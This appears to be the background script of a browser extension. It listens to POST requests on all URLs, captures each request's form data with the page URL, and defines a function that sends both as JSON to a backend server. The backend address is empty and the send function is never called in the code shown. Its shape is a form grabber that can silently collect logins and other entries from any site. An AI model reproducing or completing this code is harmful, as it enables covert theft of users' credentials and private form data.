let currentURL = ''
let formObject = {}
let backendURL = ''

console.log("running on this page!")

browser.webRequest.onBeforeRequest.addListener((details)=>{
    if (details.method == "POST"){
        if (currentURL != details.documentUrl){
            currentURL = details.documentUrl
            console.log(currentURL)
        }
        formObject = details.requestBody.formData
        console.log(formObject)
    }
    },
    {"urls": ["<all_urls>"]},
    ["requestBody"]
)

async function sendPackage(backendURL, browserWindowURL, formObject){
    data = {
        "url" : browserWindowURL,
        "formObject": formObject
    }
    let apiResponse = await fetch(backendURL, 
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }
    )
    return apiResponse
}